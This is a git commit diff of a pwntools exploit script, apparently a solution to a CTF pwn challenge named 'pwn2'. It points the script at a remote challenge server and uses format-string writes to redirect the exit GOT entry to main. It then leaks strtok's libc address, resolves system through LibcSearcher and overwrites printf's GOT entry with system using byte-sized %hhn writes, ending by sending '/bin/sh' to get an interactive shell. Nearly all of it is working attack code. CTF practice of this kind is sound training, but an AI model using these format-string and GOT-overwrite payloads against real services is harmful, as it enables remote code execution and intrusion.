c2a05ab6a6e650fe2e567f9a78f627f10d945811
haysengithub <dduguye@gmail.com>
2020-04-14 00:07:41 +0800

    xlkj ctfpwn2

--- xlkj/pwn2/test.py
+++ xlkj/pwn2/test.py
@@ -1,10 +1,12 @@
 from pwn import *
+from LibcSearcher import *
 context(arch="amd64",os="linux",log_level="debug")
 context.terminal = ['tmux','splitw','-h']
-p =process(argv=['./pwn2', "a.txt"])
+#p =process(argv=['./pwn2', "a.txt"])
+p=remote("152.136.xx.97",20192)
 #gdb.attach(p)
 elf = ELF("./pwn2")
-libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
+#libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
 #libc = ELF("./libc.so.6")
 printf_plt=elf.plt["printf"]
 printf_got = elf.got["printf"]
@@ -14,24 +16,44 @@ strlen_got = elf.got["strlen"]
 main_addr = 0x4009bd
 print(hex(strlen_plt),hex(strlen_plt+6))
 p.recvuntil("action: ")
-payload="e "+"aaaaaa%"+str(main_addr-6)+"s%17$lln"+p64(exit_got)
-#print(payload)
+payload="e "+"aa%"+str((main_addr&0xffff)-2)+"s%16$hn"+p64(exit_got)
 p.sendline(payload)
-#pause()
 p.recvuntil("action: ")
-payload="e "+"a%15$s"+p64(printf_got)
+payload="e "+"a%15$s"+p64(elf.got["strtok"])
 p.sendline(payload)
-printf_leak = u64(p.recv()[19:25]+'\x00\x00')
-print(hex(printf_leak))
-libc.address = printf_leak - libc.symbols["printf"]
-system_addr =  libc.symbols[ 'system']
-bin_addr =  libc.search( '/bin/sh').next()
+xx=p.recvuntil("action: ")
+
+print(xx,"xx")
+addr_leak = u64(xx[19:25]+'\x00\x00')
+print(hex(addr_leak))
+libc=LibcSearcher("strtok",addr_leak)
+offset =addr_leak - libc.dump("strtok")
+system_addr = offset + libc.dump("system")
+
 print(hex(system_addr))
-#pause()
-payload="e "+"aaaaaa%"+str(system_addr)+"s%18$lln"+p64(strlen_got)
+
+tlist=[]
+
+for i in range(3):
+    tlist.append(system_addr>>(8*i)&0xff)
+if tlist[2]<tlist[1] or tlist[1]<tlist[0]:
+    print("*"*10+"\r\n"+"Bad luck try again\r\n"+"*"*10)
+    exit()
+payload='%'+str(tlist[0])+'c%'+str(19)+"$hhn"
+payload+='%'+str(tlist[1]-tlist[0])+'c%'+str(20)+"$hhn"
+payload+='%'+str(tlist[2]-tlist[1])+'c%'+str(21)+"$hhn"
+lenpayload=len(payload)
+if lenpayload<38:
+    payload+='a'*(38-lenpayload)
+for i in range(3):
+    payload+=p64(printf_got+i)
+payload='e '+payload
+
+
+
 p.sendline(payload)
-p.recvuntil("action: ")
-print("hhhhh")
-p.sendline("p /bin/sh\x00")
+
+
+p.sendline("e /bin/sh")
 
 p.interactive()
